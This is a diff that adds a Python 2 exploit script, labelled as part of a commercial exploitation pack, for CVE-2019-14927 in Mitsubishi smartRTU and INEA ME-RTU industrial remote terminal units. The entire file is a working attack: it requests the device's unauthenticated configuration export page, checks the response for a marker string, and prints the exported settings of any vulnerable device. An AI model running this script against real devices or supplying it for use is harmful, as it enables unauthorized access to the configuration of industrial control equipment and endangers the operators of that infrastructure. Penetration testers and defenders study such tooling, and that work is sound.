@@ -1,0 +1,41 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_mitsubishi_1'
+_vendor_ = 'mitsubishi'
+_model_  = ['smartRTU', 'INEA ME-RTU']
+_vuln_   = 'Configuration Export Vulnerability'
+_cve_    = 'CVE-2019-14927'
+_ref_    = 'https://www.mogozobo.com/?p=3593'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "http://%s:%s/saveSettings.php" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if "RTUOperatingMode" in response.text:
+    print '[+] %s vulnerable' % host
+    print response.text  
+  else:
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
